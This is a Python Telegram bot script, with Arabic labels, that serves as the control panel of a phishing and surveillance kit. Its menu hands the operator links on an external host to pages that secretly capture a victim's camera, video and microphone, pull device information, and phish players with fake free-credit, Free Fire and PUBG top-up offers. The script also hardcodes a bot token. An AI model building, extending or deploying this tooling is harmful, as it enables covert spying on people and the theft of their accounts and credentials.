import os
import telebot
from telebot import types

TOKEN = "9275030302:AAEDUKFtF_al9eChzxTuL5hyjYAds6zNWXw"
bot = telebot.TeleBot(TOKEN)

# رابط المنصة الخارجية بعد ربطها بموقع Render
TUNNEL_URL = "https://sukuna.onrender.com"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton("📸 تصوير الكاميرا الأمامية", callback_data='cam_capture')
    btn2 = types.InlineKeyboardButton("🎥 تصوير فيديو (6 ثواني)", callback_data='vid_capture')
    btn3 = types.InlineKeyboardButton("🎙️ تسجيل صوت الضحية", callback_data='mic_capture')
    btn4 = types.InlineKeyboardButton("📱 سحب معلومات الجهاز", callback_data='info_capture')
    btn5 = types.InlineKeyboardButton("🎁 رابط صفحة (رصيد مجاني والكاميرا)", callback_data='gift_page')
    btn6 = types.InlineKeyboardButton("🔥 حدث شحن جواهر فري فاير", callback_data='phish_ff')
    btn7 = types.InlineKeyboardButton("🎯 حدث شحن شدات ببجي", callback_data='phish_pubg')
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    bot.send_message(
        user_id, 
        f"🔥 *لوحة تحكم SUKUNA* 🔥\n🆔 الآيدي الخاص بك: `{user_id}`\nاختر الأداة المطلوبة:", 
        parse_mode="Markdown", 
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    
    if call.data == 'cam_capture':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة الكاميرا...")
        bot.send_message(user_id, f"🔗 *رابط صفحة تصوير الكاميرا*:\n`{TUNNEL_URL}/cam.html?id={user_id}`", parse_mode="Markdown")
        
    elif call.data == 'vid_capture':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة الفيديو...")
        bot.send_message(user_id, f"🔗 *رابط صفحة تصوير الفيديو (6 ثواني)*:\n`{TUNNEL_URL}/video.html?id={user_id}`", parse_mode="Markdown")
        
    elif call.data == 'mic_capture':
        bot.answer_callback_query.call_id = call.id
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة الصوت...")
        bot.send_message(user_id, f"🔗 *رابط صفحة تسجيل الصوت*:\n`{TUNNEL_URL}/audio.html?id={user_id}`", parse_mode="Markdown")
        
    elif call.data == 'info_capture':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة المعلومات...")
        bot.send_message(user_id, f"🔗 *رابط صفحة سحب معلومات الجهاز*:\n`{TUNNEL_URL}/info.html?id={user_id}`", parse_mode="Markdown")

    elif call.data == 'gift_page':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة الرصيد المجاني...")
        bot.send_message(user_id, f"🔗 *رابط صفحة الرصيد المجاني*:\n`{TUNNEL_URL}/index.html?id={user_id}`", parse_mode="Markdown")
        
    elif call.data == 'phish_ff':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة فري فاير...")
        bot.send_message(user_id, f"🔗 *رابط صفحة شحن فري فاير*:\n`{TUNNEL_URL}/freefire.html?id={user_id}`", parse_mode="Markdown")
        
    elif call.data == 'phish_pubg':
        bot.answer_callback_query(call.id, "جاري تجهيز صفحة ببجي...")
        bot.send_message(user_id, f"🔗 *رابط صفحة شحن ببجي*:\n`{TUNNEL_URL}/pubg.html?id={user_id}`", parse_mode="Markdown")

if __name__ == "__main__":
    bot.infinity_polling()
